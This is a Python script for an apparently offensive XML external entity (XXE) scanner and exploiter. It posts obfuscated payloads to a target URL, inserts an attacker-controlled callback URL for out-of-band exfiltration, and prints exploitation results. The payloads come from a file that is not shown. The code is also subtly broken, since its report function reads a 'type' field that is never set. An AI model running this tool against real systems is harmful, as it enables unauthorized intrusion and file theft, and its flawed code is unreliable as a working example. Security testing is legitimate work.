import re
import urllib.parse
import base64
import requests
import logging
import concurrent.futures
import time 
from pathlib import Path
from requests.exceptions import RequestException
from payloads.payloads import Payloads 

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

class XXEDetector:
    def __init__(self, target_url, delay=2):
        self.target_url = target_url
        self.payloads = Payloads('payloads/payloads.json').get_payloads()
        self.vulnerabilities = []
        self.obfuscation_methods = ['base64', 'unicode', 'decimal', 'octal', 'hex', 'dword']
        self.delay = delay 

    def send_request(self, payload):
        headers = {'Content-Type': 'application/xml'}
        try:
            response = requests.post(self.target_url, data=f'<data>{payload}</data>', headers=headers, timeout=10)
            return response.text
        except RequestException as e:
            logging.error(f"[!] Failed to send request: {e}")
            return None

    def is_xxe_detected(self, response):
        xxe_patterns = [
            r'<!DOCTYPE\s+[^>]*[\[><]+',
            r'\bENTITY\b',
            r'\bSYSTEM\b',
            r'XML\s+parsing\s+error',
            r'Entity\s+.+?\s+not\s+defined',
        ]
        for pattern in xxe_patterns:
            if re.search(pattern, response, re.IGNORECASE):
                logging.debug(f"[+] XXE detected using pattern: {pattern}")
                return True
        return False

    def replace_placeholders(self, payload, attacker_url):
        return payload.replace("{{ATTACKER_URL}}", attacker_url).replace("{{TARGET_URL}}", self.target_url)

    def send_and_detect(self, payload, attacker_url):
        payload = self.replace_placeholders(payload, attacker_url)
        response = self.send_request(payload)
        if response and self.is_xxe_detected(response):
            return {'payload': payload, 'response': response}
        return None

    def detect_xxe_vulnerabilities(self, attacker_url):
        logging.info("[*] Starting XXE vulnerability detection...")

        all_payloads = []
        for _, payloads in self.payloads.items():
            for payload in payloads:
                all_payloads.append(payload)

                obfuscated_payloads = Payloads('').apply_obfuscation(payload, self.obfuscation_methods)
                all_payloads.extend(obfuscated_payloads)

        detected_vulnerabilities = []
        for payload in all_payloads:
            result = self.send_and_detect(payload, attacker_url)
            if result:
                logging.info(f"[+] Vulnerability detected with payload: {result['payload']}")
                detected_vulnerabilities.append(result)

            time.sleep(self.delay)

        self.vulnerabilities = detected_vulnerabilities
        return self.vulnerabilities

    def exploit_xxe(self, payload):
        logging.info(f"[*] Attempting to exploit with payload: {payload}")
        response = self.send_request(payload)

        time.sleep(self.delay)

        print("[*] Exploitation Result:")
        print(response)
        print("=" * 50)

    def report_vulnerabilities(self):
        if self.vulnerabilities:
            print("Detected XXE Vulnerabilities:")
            report_content = "Detected XXE Vulnerabilities:\n"
            for vulnerability in self.vulnerabilities:
                report_entry = f"Type: {vulnerability['type']}, Payload: {vulnerability['payload']}\n"
                print(report_entry)
                report_content += report_entry

            self.save_report(report_content)
        else:
            print("[!] No XXE vulnerabilities detected.")

    def save_report(self, report_data, filename="XXE_Report.txt"):
        home = Path.home()
        report_path = home / 'Downloads' / filename
        if not report_path.parent.exists():
            report_path = home / filename

        with report_path.open('w', encoding='utf-8') as report_file:
            report_file.write(report_data)
        print(f"[**] Report saved to: {report_path}")
